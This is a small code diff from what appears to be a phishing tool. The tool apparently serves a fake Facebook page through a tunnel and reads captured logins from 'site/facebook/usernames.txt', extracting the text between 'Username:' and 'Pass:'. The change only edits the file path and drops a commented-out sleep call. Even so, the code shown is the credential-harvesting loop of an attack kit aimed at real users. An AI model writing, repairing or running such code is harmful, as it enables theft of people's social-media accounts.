@@ -16,9 +16,8 @@ for i in datajson['tunnels']:
 os.system('clear')
 print (msg)
 while True:
-	if os.path.isfile("/site/facebook/usernames.txt")==True:
-	 #time.sleep(0.75)
-		tr2=open("/site/facebook/usernames.txt","r")
+	if os.path.isfile("site/facebook/usernames.txt")==True:
+		tr2=open("site/facebook/usernames.txt","r")
 		log2=tr2.readline()
 		start=int(log2.find("Username:"))
 		end=int(log2.find("Pass:"))
